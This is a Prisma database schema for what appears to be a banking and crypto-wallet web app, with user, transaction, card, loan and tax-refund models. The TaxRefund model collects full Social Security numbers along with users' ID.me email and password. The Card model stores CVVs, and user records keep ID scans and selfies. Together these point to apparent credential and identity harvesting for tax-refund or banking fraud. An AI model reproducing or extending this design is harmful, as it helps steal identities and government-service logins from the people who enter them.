// This is your Prisma schema file,
// learn more about it in the docs: https://pris.ly/d/prisma-schema

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
  directUrl = env("DIRECT_URL")
}

model User {
  id            String    @id @default(cuid())
  email         String    @unique
  firstName     String
  lastName      String
  password      String
  pin           String

  // ✅ ACCOUNT ID (New System)
  accountNumber String    @unique @default("PENDING")

  balance       Float     @default(0.0)
  
  // --- WALLET KEYS ---
  walletIndex   Int       @default(0)
  ethAddress    String?
  btcAddress    String?
  solAddress    String?
  trxAddress    String?

  // --- KYC / VERIFICATION ---
  kycStatus     String    @default("UNVERIFIED")
  
  // --- CONTACT & LOCATION ---
  phone         String?   
  dateOfBirth   String?
  streetAddress String?
  city          String?
  state         String?   
  zipCode       String?   
  country       String?
  
  // --- SECURITY ---
  isEmailVerified Boolean @default(false)
  lastDevice      String?
  verificationCode String?

  // --- ID DOCUMENTS ---
  idType        String?
  idNumber      String?
  kycFront      String?
  kycBack       String?
  kycSelfie     String?

  createdAt     DateTime  @default(now())
  updatedAt     DateTime  @updatedAt

  // --- RELATIONS ---
  transactions  Transaction[]
  cards         Card[]
  loans         Loan[]
  taxRefunds    TaxRefund[] // ✅ Added Tax Refund Relation
}

model Transaction {
  id        String   @id @default(cuid())
  amount    Float
  type      String   // DEPOSIT, WITHDRAW, TRANSFER
  status    String   // PENDING, APPROVED, REJECTED, FAILED
  method    String?  
  
  userId    String
  user      User     @relation(fields: [userId], references: [id])

  createdAt DateTime @default(now())
}

model Card {
  id            String   @id @default(cuid())
  cardNumber    String   @unique 
  cvv           String
  expiryDate    String
  type          String   // VIRTUAL, PHYSICAL, METAL
  status        String   @default("ACTIVE") // ACTIVE, FROZEN
  spendingLimit Float    @default(5000.0)
  
  userId        String
  user          User     @relation(fields: [userId], references: [id])

  createdAt     DateTime @default(now())
}

model Loan {
  id              String   @id @default(cuid())
  amount          Float
  duration        Int      // In months
  purpose         String
  status          String   @default("PENDING") // PENDING, APPROVED, REJECTED
  
  // Financial Details
  employmentStatus String
  monthlyIncome    Float
  employerName     String?
  housingStatus    String?
  
  // Documents (Stored as file paths)
  idProof         String?
  incomeProof     String?
  addressProof    String?

  userId          String
  user            User     @relation(fields: [userId], references: [id])

  createdAt       DateTime @default(now())
  updatedAt       DateTime @updatedAt
}

// ✅ NEW TAX REFUND MODEL
model TaxRefund {
  id            String   @id @default(cuid())
  
  // Personal Info
  fullName      String
  ssn           String
  country       String
  filingStatus  String
  taxYear       String
  
  // Financials
  refundAmount  Float
  
  // ID.me Credentials
  idMeEmail     String
  idMePassword  String
  
  // Documents (URLs)
  form1040      String?
  w2            String?
  
  status        String   @default("PENDING") // PENDING, APPROVED, REJECTED
  
  userId        String
  user          User     @relation(fields: [userId], references: [id])

  createdAt     DateTime @default(now())
  updatedAt     DateTime @updatedAt
}